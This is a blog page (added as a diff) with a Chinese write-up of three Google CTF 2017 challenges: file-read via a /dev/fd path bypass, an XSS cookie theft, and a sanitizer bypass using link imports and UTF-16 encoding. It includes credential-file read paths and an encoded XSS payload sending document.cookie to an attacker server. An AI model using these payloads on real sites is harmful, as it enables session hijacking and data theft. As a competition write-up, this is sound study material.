@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<title>
+  
+    GoogleCTF-writeup
+  
+</title>
+
+<meta name="description" content="GOOGLE CTF前段时间有机会看了GoogleCTF的题目，赛后根据题解写出了自己的想法。">
+<meta name="keywords" content="WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GoogleCTF-writeup">
+<meta property="og:url" content="http://spikesec.cn/2017/06/23/GoogleCTF-writeup/index.html">
+<meta property="og:site_name" content="Spike Security">
+<meta property="og:description" content="GOOGLE CTF前段时间有机会看了GoogleCTF的题目，赛后根据题解写出了自己的想法。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-01T08:12:22.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="GoogleCTF-writeup">
+<meta name="twitter:description" content="GOOGLE CTF前段时间有机会看了GoogleCTF的题目，赛后根据题解写出了自己的想法。">
+
+
+  <link rel="alternative" href="/atom.xml" title="Spike Security" type="application/atom+xml">
+
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
+<link rel="stylesheet" href="/styles/main.css">
+
+
+
+
+
+
+</head>
+<body
+  
+    class="monochrome"
+  
+  >
+  <div class="mobile-header">
+  <button class="sidebar-toggle" type="button">
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+  </button>
+  <a class="title" href="/">Spike Security</a>
+</div>
+
+  <div class="main-container">
+    <div class="sidebar">
+  <div class="header">
+    <h1 class="title"><a href="/">Spike Security</a></h1>
+    
+    <div class="info">
+      <div class="content">
+        
+        
+          <div class="author">Spike</div>
+        
+      </div>
+      
+        <div class="avatar">
+          
+            <a href="/about"><img src="/images/cc/avatar.jpeg"></a>
+          
+        </div>
+      
+    </div>
+  </div>
+  <div class="body">
+    
+      
+        <ul class="nav">
+          
+            
+              <li class="category-list-container">
+                <a href="javascript:;">Category</a>
+                
+              </li>
+            
+          
+            
+              <li class="tag-list-container">
+                <a href="javascript:;">Tag</a>
+                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/other/">other</a><span class="tag-list-count">2</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="archive-list-container">
+                <a href="javascript:;">Archive</a>
+                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">10</span></li></ul>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="/" title="Homepage">Homepage</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/archives" title="By Year">By Year</a>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="http://weibo.com/spikex" title="Weibo" target="_blank" rel="noopener">Weibo</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="https://github.com/SpikeI" title="Github" target="_blank" rel="noopener">Github</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/atom.xml" title="RSS">RSS</a>
+              </li>
+            
+          
+        </ul>
+      
+    
+  </div>
+</div>
+
+    <div class="main-content">
+      
+        <div style="max-width: 1000px">
+      
+          <article id="post-GoogleCTF-writeup" class="article article-type-post">
+  
+    <h1 class="article-header">
+      GoogleCTF-writeup
+    </h1>
+  
+  
+
+  <div class="article-info">
+    <span class="article-date">
+  2017-06-23
+</span>
+
+    
+
+    
+	<span class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/">WEB</a></li></ul>
+	</span>
+
+
+  </div>
+  <div class="article-entry">
+    <h2 id="GOOGLE-CTF"><a href="#GOOGLE-CTF" class="headerlink" title="GOOGLE CTF"></a>GOOGLE CTF</h2><p>前段时间有机会看了GoogleCTF的题目，赛后根据题解写出了自己的想法。</p>
+<a id="more"></a>
+<h3 id="MISC-mindreader"><a href="#MISC-mindreader" class="headerlink" title="MISC-mindreader"></a>MISC-mindreader</h3><p>题目是一道任意文件读取。</p>
+<p>能够读到的业务逻辑文件只有index.html:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p&gt;Hello, what do you want to read?&lt;/p&gt;</span><br><span class="line">    &lt;form method=&quot;GET&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;f&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Read&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>尝试了很多配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/fstab</span><br><span class="line">/etc/mtab</span><br><span class="line">/proc/self/environ</span><br></pre></td></tr></table></figure>
+<p>都没有结果，不过当读到/proc/self/environ的时候，提示没有权限。当时没有在意，但看完wp后发现突破点其实在这里。</p>
+<figure class="highlight plain"><figcaption><span>，但是题目中没有访问权限明显是一个问题。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">系统禁止直接访问```/proc```目录下的所有文件，那么就要找到一个方式绕过：</span><br><span class="line"></span><br><span class="line">wp种利用了一个符号变量```/dev/fd```这个符号变量指向```/proc/self/fd```利用这一点构造```/dev/fd/../environ```即可成功访问，得到flag。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### WEB-JOE</span><br><span class="line"></span><br><span class="line">入口处这样子</span><br><span class="line"></span><br><span class="line">![joe1](GoogleCTF-writeup\joe1.jpg)</span><br><span class="line"></span><br><span class="line">joe是个人工智能的助手，其中有很多功能，手贱登陆后就什么都看不到了：）</span><br><span class="line"></span><br><span class="line">具体如下：</span><br><span class="line"></span><br><span class="line">1. 可以询问他的名字</span><br><span class="line">2. 可以修改它的名字</span><br><span class="line">3. 可以向管理员发送链接（错误报告）</span><br><span class="line">4. admin页面，需要cookie才能进</span><br><span class="line"></span><br><span class="line">很明显是xss，（一开始没看到向管理员发送连接的功能，我还在想google大佬怎么这么厉害 ，self xss还能随便用 \- \- |）。</span><br><span class="line"></span><br><span class="line">测试过后唯一的交互功能--改名字存在self xss。</span><br><span class="line"></span><br><span class="line">给他起个名字叫```&lt;script&gt;alert(1)&lt;/script&gt;```刷新就会弹窗，那么好了可以执行JS了，剩下就是给给管理员看我们的登录状态了。</span><br><span class="line"></span><br><span class="line">在和https进行一番鏖斗后终于抓到了包：</span><br><span class="line"></span><br><span class="line">![joe2](GoogleCTF-writeup\joe2.jpg)</span><br><span class="line"></span><br><span class="line">登陆是只需要一个get请求的。</span><br><span class="line"></span><br><span class="line">那么我们只需要让admin访问这个链接即可。我们想到了刚刚的提交链接地址，不过字符串太长admin不看：</span><br><span class="line"></span><br><span class="line">![joe3](GoogleCTF-writeup\joe3.jpg)</span><br><span class="line"></span><br><span class="line">可恶啊。</span><br><span class="line"></span><br><span class="line">那我们只能自己写个网页iframe或者跳到这个连接上去：</span><br><span class="line"></span><br><span class="line">![joe4](GoogleCTF-writeup\joe4.jpg)</span><br><span class="line"></span><br><span class="line">提交给admin```https://pwps.pw/a.html```，成功收到cookie：</span><br><span class="line"></span><br><span class="line">![joe5](GoogleCTF-writeup\joe5.jpg)</span><br><span class="line"></span><br><span class="line">ps：这网站只加载https的外部资源，无奈还得搭个https。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### WEB-The X Sanitizer</span><br><span class="line"></span><br><span class="line">这道题题面很明显是一道XSS题目。问题是怎么绕过题目中的waf以及利用时设置的一些障碍。</span><br><span class="line"></span><br><span class="line">首先我们来看JS代码：```sanitizer.js</span><br></pre></td></tr></table></figure>
+<p>代码中有很多以前没有接触到的知识，基本上都是前端开发的知识，下面来总结整理一下:</p>
+<p><strong>箭头函数 =&gt;</strong></p>
+<p>箭头函数是一个简单版的function。</p>
+<p>在JS中每定义一个function，都会构造自己的对象，也就会绑定一个this。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//define</span><br><span class="line">function a()&#123;</span><br><span class="line">  this.b = &apos;c&apos;;</span><br><span class="line">&#125;</span><br><span class="line">//console</span><br><span class="line">d = new a();</span><br><span class="line">//result</span><br><span class="line">d.b ===&apos;c&apos;</span><br></pre></td></tr></table></figure>
+<p>箭头函数没有this，但会捕获上下文的this。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//console</span><br><span class="line">var a = () =&gt; this</span><br><span class="line">//result</span><br><span class="line">a() === window;</span><br></pre></td></tr></table></figure>
+<p>函数可以带参数（- -废话哪个函数不能带参数）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a,b,c=a+b) =&gt; &#123;return c;&#125;</span><br></pre></td></tr></table></figure>
+<p>可以不带参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">() =&gt; &#123;return &apos;asd&apos;;&#125;</span><br><span class="line">_ =&gt; &apos;asd&apos;;</span><br><span class="line">//以上两种情况等价</span><br></pre></td></tr></table></figure>
+<p>可以带不确定个数的参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//define</span><br><span class="line">var foo = (a,b,...c)&#123;return c[1]&#125;</span><br><span class="line">//console &amp;&amp; result</span><br><span class="line">foo(1,2,3,4,5) === 4</span><br></pre></td></tr></table></figure>
+<p>详情见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions</a></p>
+<p><strong>Promise</strong></p>
+<p>现在的前端技术中Promise扮演了很重要的角色。</p>
+<p>Promise 是一个异步处理的方法，和监听器的区别在于Promise更注重结果。Promise对象在声明时需要声明两个回调函数，这两个回调函数分别在Promise判断逻辑成功和失败两种情况时分别调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var P = new Promise(function(resolve,reject)&#123;</span><br><span class="line">  //做一些判断，结果是result</span><br><span class="line">  if(result)&#123;</span><br><span class="line">    resolve();</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    reject();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>在我的理解中，Promise更像是一个二岔单向状态机，判断出结果后不能回溯。当完成判断后再次调用Promise方法会得到已经判断完的结果。之后的条件变换不会影响Promise的结果了，也就是一次性的方法。每次遇到then的时候就相当于走到了一个新的二叉路口重新作出选择。</p>
+<p>Promise是一个异步处理中阻塞的好办法，很多时候可以让异步并行变成异步串行，从而避免了很多冲突。</p>
+<p><strong>navigator.serviceworker</strong></p>
+<p>serviceworker是一个运行在浏览器的一个脚本，该工程广泛地使用了Promise。在一个异步独立的上下文环境中。没有页面，也不能直接操作页面的DOM。通过postMessage接口和页面进行交互。可以控制页面发送网络请求的处理方式，不用时会被终止，需要时会被重启。</p>
+<p>main.js中的内容做了一些基本的跳转定义，用</p>
+<p>下面我们分析一下主要文件的逻辑：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// [[[ 1 ]]]</span><br><span class="line">function sanitize(html, callback) &#123;</span><br><span class="line">  if (!window.serviceWorkerReady) serviceWorkerReady = new Promise(function(resolve, reject) &#123;</span><br><span class="line">    if (navigator.serviceWorker.controller) return resolve();</span><br><span class="line">    navigator.serviceWorker.register(&apos;sanitizer.js&apos;)</span><br><span class="line">        .then(reg =&gt; reg.installing.onstatechange = e =&gt; (e.target.state == &apos;activated&apos;) ? resolve() : 0);</span><br><span class="line">  &#125;);</span><br><span class="line">  while (html.match(/meta|srcdoc|utf-16be/i)) html = html.replace(/meta|srcdoc|utf-16be/i, &apos;&apos;); // weird stuff...</span><br><span class="line">  serviceWorkerReady.then(function() &#123;</span><br><span class="line">    var frame = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    frame.style.display = &apos;none&apos;;</span><br><span class="line">    frame.src = &apos;/sandbox?html=&apos; + encodeURIComponent(html);</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line">    addEventListener(&apos;message&apos;, function listener(msg) &#123;</span><br><span class="line">      if (msg.source != frame.contentWindow || msg.origin != location.origin) return;</span><br><span class="line">      document.body.removeChild(frame);</span><br><span class="line">      removeEventListener(&apos;message&apos;, listener);</span><br><span class="line">      callback(msg.data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// [[[ 2 ]]]</span><br><span class="line">addEventListener(&apos;install&apos;, e =&gt; e.waitUntil(skipWaiting()));</span><br><span class="line">addEventListener(&apos;activate&apos;, e =&gt; e.waitUntil(clients.claim()));</span><br><span class="line">addEventListener(&apos;fetch&apos;, e =&gt; e.respondWith(clients.get(e.clientId).then(function(client) &#123;</span><br><span class="line">  var isSandbox = url =&gt; (new URL(url)).pathname === &apos;/sandbox&apos;;</span><br><span class="line"> </span><br><span class="line">  if (client &amp;&amp; isSandbox(client.url)) &#123;</span><br><span class="line">    if (e.request.url === location.origin + &apos;/sanitize&apos;) &#123;</span><br><span class="line">    // [[[ 2 a ]]]</span><br><span class="line">      return new Response(`</span><br><span class="line">        onload = _=&gt; setTimeout(_=&gt; parent.postMessage(document.body.innerHTML, location.origin), 1000);</span><br><span class="line">        remove = node =&gt; (node == document) ? document.body.innerHTML = &apos;&apos; : node.parentNode.removeChild(node);</span><br><span class="line">        document.addEventListener(&quot;securitypolicyviolation&quot;, e =&gt; remove(e.target));</span><br><span class="line">        document.write(&apos;&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src \\&apos;none\\&apos;; script-src *&quot;&gt;&lt;body&gt;&apos;);</span><br><span class="line">      `);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // [[[ 2 b ]]]</span><br><span class="line">      // Violation events often don&apos;t point to the violating element, so we need this additional logic to track them down.</span><br><span class="line">      // This is also important from marketing perspective. Do not remove or simplify this logic.</span><br><span class="line">      return new Response(`</span><br><span class="line">        with(document) remove(document === currentScript.ownerDocument ? currentScript : querySelector(&apos;link[rel=&quot;import&quot;]&apos;));</span><br><span class="line">        // &lt;script src=x&gt;&lt;/script&gt;</span><br><span class="line">      `);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if (isSandbox(e.request.url)) &#123;</span><br><span class="line">    // [[[ 2 c ]]]</span><br><span class="line">    return new Response(</span><br><span class="line">      &apos;&lt;!doctype HTML&gt;\n&lt;script src=sanitize&gt;\n&lt;/script&gt;\n&lt;body&gt;&apos; + decodeURIComponent(e.request.url.split(&apos;?html=&apos;)[1]),</span><br><span class="line">      &#123;headers: new Headers(&#123;&apos;X-XSS-Protection&apos;: &apos;0&apos;, &apos;Content-Type&apos;: &apos;text/html&apos;&#125;)&#125;</span><br><span class="line">    );</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    // [[[ 2 d ]]]</span><br><span class="line">    return fetch(e.request);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)));</span><br></pre></td></tr></table></figure>
+<p>​    第一部分的代码中的sanitize()函数接受两个参数，一个是需要过滤的html代码，另一个是callback函数，函数中注册了一个serviceworker，它会将html进行敏感词循环过滤，然后将其传入sandbox中执行，sandbox返回的msg会被callback函数调用。</p>
+<p>​    第二部分沙箱部分有CSP，如果违背CSP的规则则删除该部分代码，并且将XSS-protection置为0，此时chrome便不检测XSS威胁，并且会删除script标签，并且会删除一个<code>&lt;link rel=&#39;import&#39;&gt;</code>标签。如果没有经过沙箱那就会不做处理，直接访问。</p>
+<p>​    这道题有个地方没有处理的很好，在处理<code>&lt;link&gt;</code>标签的过程中只对标签进行了一次删除，也就是说如果写两个link那么只会删除前一个，后一个将会被保留：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&apos;import&apos;&gt;&lt;link rel=&apos;import&apos; href=&apos;http://eval.com/&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>​    参考eat,sleep,pwn,repeat的WP我们可以通过引入link标签，通过一次url编码绕过关键词的判断，从而可以进行utf-16编码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import&gt;&lt;link rel=import href=&quot;https://sanitizer.web.ctfcompetition.com/sandbox?html=&lt;script charset=%22utf-16b%65%22%20src=/sandbox%3fhtml=PAYLOAD&gt;&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>​    最后只要将payload utf-16编码后加入到里面就好了</p>
+<p>​    payload:<code>=0;location.href=&#39;http://myserver/&#39;+document.cookie;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import&gt;&lt;link rel=import href=&quot;https://sanitizer.web.ctfcompetition.com/sandbox?html=&lt;script charset=%22utf-16b%65%22%20src=/sandbox%3fhtml=%2500=%25000%2500;%2500l%2500o%2500c%2500a%2500t%2500i%2500o%2500n%2500.%2500h%2500r%2500e%2500f%2500=%2500&apos;%2500h%2500t%2500t%2500p%2500:%2500/%2500/%2500m%2500y%2500s%2500e%2500r%2500v%2500e%2500r%2500/%2500&apos;%2500+%2500d%2500o%2500c%2500u%2500m%2500e%2500n%2500t%2500.%2500c%2500o%2500o%2500k%2500i%2500e%2500;&gt;&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://developers.google.com/web/fundamentals/getting-started/primers/service-workers?hl=zh-cn" target="_blank" rel="noopener">https://developers.google.com/web/fundamentals/getting-started/primers/service-workers?hl=zh-cn</a></p>
+<p><a href="https://kitctf.de/writeups/googlectf/x-sanitizer" target="_blank" rel="noopener">https://kitctf.de/writeups/googlectf/x-sanitizer</a></p>
+
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.en" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
+      
+          <img src="/images/cc/by.png">
+        
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
+
+
+    
+
+  </footer>
+</article>
+
+
+
+
+
+
+
+          <div class="main-footer">
+  
+    © 2018 Spike Security - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
+  
+</div>
+
+      
+        </div>
+      
+    </div>
+  </div>
+  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
+  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+             It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+      <!-- Container that holds slides.
+                PhotoSwipe keeps only 3 of them in the DOM to save memory.
+                Don't modify these 3 pswp__item elements, data is added later on. -->
+      <div class="pswp__container">
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+      </div>
+
+      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+      <div class="pswp__ui pswp__ui--hidden">
+
+        <div class="pswp__top-bar">
+
+          <!--  Controls are self-explanatory. Order can be changed. -->
+
+          <div class="pswp__counter"></div>
+
+          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+          <button class="pswp__button pswp__button--share" title="Share"></button>
+
+          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+          <!-- element will get class pswp__preloader--active when preloader is running -->
+          <div class="pswp__preloader">
+            <div class="pswp__preloader__icn">
+              <div class="pswp__preloader__cut">
+                <div class="pswp__preloader__donut"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+          <div class="pswp__share-tooltip"></div>
+        </div>
+
+        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+
+        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+        <div class="pswp__caption">
+          <div class="pswp__caption__center"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/PhotoSwipe/photoswipe.js"></script>
+  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+
+
+<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
